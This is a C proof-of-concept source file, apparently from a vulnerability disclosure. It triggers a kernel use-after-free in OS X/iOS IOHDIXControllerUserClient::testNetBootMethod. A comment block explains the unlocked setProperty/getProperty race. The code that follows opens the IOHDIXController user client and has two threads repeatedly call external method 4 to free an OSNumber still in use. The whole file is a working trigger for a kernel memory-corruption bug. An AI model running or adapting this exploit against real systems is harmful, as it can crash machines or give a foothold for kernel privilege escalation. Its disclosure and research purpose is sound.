//ianbeer

//build: clang -o hdix_uaf hdix_uaf.c -framework IOKit -lpthread

/*
OS X/iOS kernel UAF due to lack of locking in IOHDIXControllerUserClient::testNetBootMethod

External method 4 of IOHDIXControllerUserClient is testNetBootMethod which takes a variables-sized structure input.

This method calls _LOCAL_di_root_image which uses the IOService apis to look up an IOHDIXController object.

On this object it calls ::setProperty("di-root-image", OSString(user_controlled_string))

IOHDIXController overrides the setProperty method and implements it without any locking. When setting the
"di-root-image" property the code first calls release on the OSNumber* at +0x118 if it is non-null, then sets it to NULL.
Further down this pointer field is set to point to a new OSNumber object.

This is the first race condition. Since there's no locking two threads can race causing two release calls on an object
with only one reference leading to a UaF.

Back in _LOCAL_di_root_image the code then calls ::getProperty("di-root-image-result") on the IOHDIXController which is also overriden
and just returns the pointer at this+0x118 without taking any references.

Since there's no locking anywhere a more likely race condition to occur is that one thread calls ::getProperty("di-root-image-result") then
the other thread calls ::setProperty("di-root-image", OSString(user_controlled_string)) which frees the OSNumber the first thread has a pointer to.

This leads quite quickly to a UaF when the OSNumber is used in a few places later on.

Tested on OS X 10.11.3 El Capitan 15D21 on MacBookAir5,2
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

#include <libkern/OSAtomic.h>

#include <mach/thread_act.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/mman.h>
    
unsigned int selector = 0;

uint64_t inputScalar[16];
size_t inputScalarCnt = 0;

uint8_t inputStruct[4096];
size_t inputStructCnt = 0; 

uint64_t outputScalar[16] = {0};
uint32_t outputScalarCnt = 0;

char outputStruct[4096] = {0};
size_t outputStructCnt = 0;

io_connect_t global_conn = MACH_PORT_NULL;

void set_params(io_connect_t conn){
  char* payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  global_conn = conn;
  selector = 4;
  inputScalarCnt = 0;
  inputStructCnt = strlen(payload)+1;
  strcpy((char*)inputStruct, payload);
  outputScalarCnt = 0;
  outputStructCnt = 0;  
}

void make_iokit_call(){  
  IOConnectCallMethod(
      global_conn,
      selector,
      inputScalar,
      inputScalarCnt,
      inputStruct,
      inputStructCnt,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt);
}

OSSpinLock lock = OS_SPINLOCK_INIT;

void* thread_func(void* arg){
  for(;;) {
    int got_it = 0;
    while (!got_it) {
      got_it = OSSpinLockTry(&lock);
    }

    //usleep(10);

    make_iokit_call();
  }
  return NULL;
}

mach_port_t get_user_client(char* name, int type) {
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching(name);
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), type, &conn);
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  return conn;
}

int main(int argc, char** argv){
  OSSpinLockLock(&lock);

  pthread_t t;
  pthread_create(&t, NULL, thread_func, NULL);

  mach_port_t conn = get_user_client("IOHDIXController", 0);
  
  set_params(conn);
  for(;;) {
    OSSpinLockUnlock(&lock);
    make_iokit_call();
  }
  return 0;
}
